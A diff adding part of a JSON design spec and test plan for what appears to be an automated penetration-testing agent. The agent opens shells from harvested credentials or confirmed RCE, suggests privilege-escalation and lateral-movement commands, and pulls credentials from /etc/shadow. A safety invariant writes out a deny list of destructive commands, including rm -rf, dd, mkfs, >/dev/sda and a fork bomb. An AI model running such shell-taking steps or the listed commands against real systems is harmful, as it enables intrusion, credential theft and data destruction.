+        "verification": "Test: ingest same shell evidence twice, verify only one FalsificationTask created. Deduplication by content_hash evidence_id."
+      },
+      {
+        "id": "INV-E2-06",
+        "description": "Shell command candidates from M1_OBJECTIVE_DRIVEN MUST NOT contain dangerous commands (rm -rf, dd, mkfs, format) even when those commands would serve an objective. The command strings in objective_command_map are the SOURCE OF TRUTH — no dynamic command construction.",
+        "verification": "Audit objective_command_map for dangerous patterns. At least one command per objective mode. No command contains rm, dd, mkfs, >/dev/sda, format, or :(){ :|:& };:."
+      }
+    ]
+  },
+
+  "test_plan": {
+    "description": "Test suite for E2 (extends e1_interactive_shell_test.py with E2-specific tests)",
+
+    "new_test_file": "tests/e2_shell_candidate_generation_test.py",
+
+    "test_cases": [
+      {
+        "id": "E2-T01",
+        "type": "unit",
+        "description": "T1 Credential Discovery Trigger: WorldModel with CREDENTIAL + SSH SERVICE → shell_connect candidate produced",
+        "verification": "assert len(candidates) == 1, candidates[0]['action_type'] == 'shell_connect'"
+      },
+      {
+        "id": "E2-T02",
+        "type": "unit",
+        "description": "T2 Exploit Confirmation Trigger: CONFIRMED RCE hypothesis → shell_connect candidate with method='payload_injection'",
+        "verification": "assert candidates[0]['method'] == 'payload_injection'"
+      },
+      {
+        "id": "E2-T03",
+        "type": "unit",
+        "description": "T3 Chain Advisory Trigger: ChainSynthesizer returns shell step → shell_connect candidate",
+        "verification": "assert candidates[0]['origin'] == 'SHELL_TRIGGER_T3'"
+      },
+      {
+        "id": "E2-T04",
+        "type": "unit",
+        "description": "Shell_connect NOT proposed for target with active ShellSession (INV-E2-03)",
+        "verification": "assert len(candidates) == 0"
+      },
+      {
+        "id": "E2-T05",
+        "type": "unit",
+        "description": "M1 Objective-Driven: active shell + PRIVESC objective → shell_command candidates for sudo -l, find -perm, uname",
+        "verification": "assert any('sudo -l' in c['command'] for c in cmd_candidates)"
+      },
+      {
+        "id": "E2-T06",
+        "type": "unit",
+        "description": "M1 Objective-Driven: active shell + LATERAL objective → shell_command candidates for ip addr, netstat, ssh keys",
+        "verification": "assert any('ip addr' in c['command'] for c in cmd_candidates)"
+      },
+      {
+        "id": "E2-T07",
+        "type": "unit",
+        "description": "Stale session rejection (INV-E2-02): TERMINATED session → empty command candidate list",
+        "verification": "assert len(cmd_candidates) == 0"
+      },
+      {
+        "id": "E2-T08",
+        "type": "unit",
+        "description": "WorldModel.ingest_process_list: E1 process_list evidence → PROCESS entity created + OBSERVED_IN relationship",
+        "verification": "processes = world.get_entities_by_type(EntityType.PROCESS); assert len(processes) > 0"
+      },
+      {
+        "id": "E2-T09",
+        "type": "unit",
+        "description": "WorldModel.ingest_file_content: /etc/shadow → FILE + CREDENTIAL entities created",
+        "verification": "creds = world.get_entities_by_type(EntityType.CREDENTIAL); assert len(creds) > 0"
+      },
+      {
+        "id": "E2-T10",
+        "type": "unit",
+        "description": "Falsification re-engagement: VULNERABILITY entity with suid_binary → FalsificationTask created for exploit viability",
+        "verification": "assert falsification_task is not None"
+      },
+      {
+        "id": "E2-T11",
+        "type": "adversarial",
+        "description": "No infinite falsification loop (INV-E2-05): same shell evidence ingested twice → only one FalsificationTask created",
+        "verification": "count = len(falsification_manager.get_tasks_for_entity(entity_id)); assert count == 1"
+      },
+      {
+        "id": "E2-T12",
+        "type": "adversarial",
+        "description": "Invalid session_entity_id in ingest_shell_evidence → ValueError (INV-E2-04)",
+        "verification": "with pytest.raises(ValueError): world.ingest_shell_evidence(evidence, 'invalid_session')"
+      },
+      {
+        "id": "E2-T13",
+        "type": "integration",
+        "description": "AblationRunner._generate_candidates with E2 enabled → shell candidates included in output",
+        "verification": "candidates = runner._generate_candidates(view, runner); assert any(c['candidate_origin'] == 'SHELL_TRIGGER' for c in candidates)"
+      },
+      {
+        "id": "E2-T14",
+        "type": "integration",
+        "description": "Planner.decide() with shell candidates → selects highest-utility shell candidate when appropriate",
+        "verification": "decision = planner.decide(candidates, 'obj_001'); assert 'shell_connect_initiated' in decision.rationale_codes"
+      },
+      {
+        "id": "E2-T15",
+        "type": "regression",
+        "description": "Existing candidate generators still produce non-shell candidates (no regression)",
+        "verification": "student_candidates = StudentCandidateGenerator().generate_candidates(target, profile); assert len(student_candidates) > 0"
+      },
+      {
+        "id": "E2-T16",
+        "type": "regression",
+        "description": "E1 test suite still passes after E2 changes",
+        "verification": "subprocess.run(['pytest', 'tests/e1_interactive_shell_test.py', '-v'])"
+      },
+      {
+        "id": "E2-T17",
+        "type": "regression",
+        "description": "D-series and S-series tests still pass after E2 changes",
+        "verification": "subprocess.run(['pytest', 'tests/test_stage1_invariants.py', 'tests/test_d5_preflight.py', 'tests/test_d5_seven_gate_proof.py', '-v'])"
+      }
+    ],
+
+    "minimum_pass": "All 17 tests passing, 0 failures"
+  },
+
+  "delivery_checklist": [
+    "ShellCandidateGenerator implemented at orchestrator/brain/candidate_generators/shell_generator.py",
+    "T1, T2, T3 trigger conditions evaluated against WorldModel state",
+    "M1 objective_command_map produces correct commands for each objective",
+    "M2 ChainSynthesizer advisory integration produces chain-aware commands",
+    "WorldModel.ingest_shell_evidence() dispatches to correct evidence-type handler",
+    "WorldModel methods: ingest_shell_evidence(), update_host_from_shell(), get_session_host()",
+    "Falsification re-engagement paths create FalsificationTasks from shell evidence",
+    "Planner.decide() enhanced shell scoring with context awareness",
+    "5 new AttackUnit entries in ChainSynthesizer for shell-based chains",
+    "AblationRunner._generate_candidates() integrates ShellCandidateGenerator",
+    "INV-E2-01 through INV-E2-06 safety invariants verified by test suite",
+    "E2-T01 through E2-T17 all passing",
+    "E1 regression: all 34 interactive_shell tests still passing",
+    "D-series regression: all D5 + S1 tests still passing"
+  ],
+
+  "acceptance_criteria": [
+    "C1: ShellCandidateGenerator produces shell_connect candidates when credentials + SSH service exist in WorldModel",
+    "C2: ShellCandidateGenerator produces shell_connect candidates when RCE hypothesis is CONFIRMED",
+    "C3: ShellCandidateGenerator produces shell_connect candidates when ChainSynthesizer advisory indicates shell step",
+    "C4: ShellCandidateGenerator produces shell_command candidates filtered by current objective for active sessions",
+    "C5: Planner.decide() scores shell candidates contextually and selects them when they are the best option",
+    "C6: WorldModel ingests all 8 E1 evidence types into entity/relationship graph",
+    "C7: FalsificationManager creates tasks from shell-derived VULNERABILITY and CREDENTIAL evidence",
+    "C8: No regression in E1 (34 tests), D-series, or S-series test suites",
+    "C9: All 6 E2 safety invariants verified by automated tests"
+  ]
+}
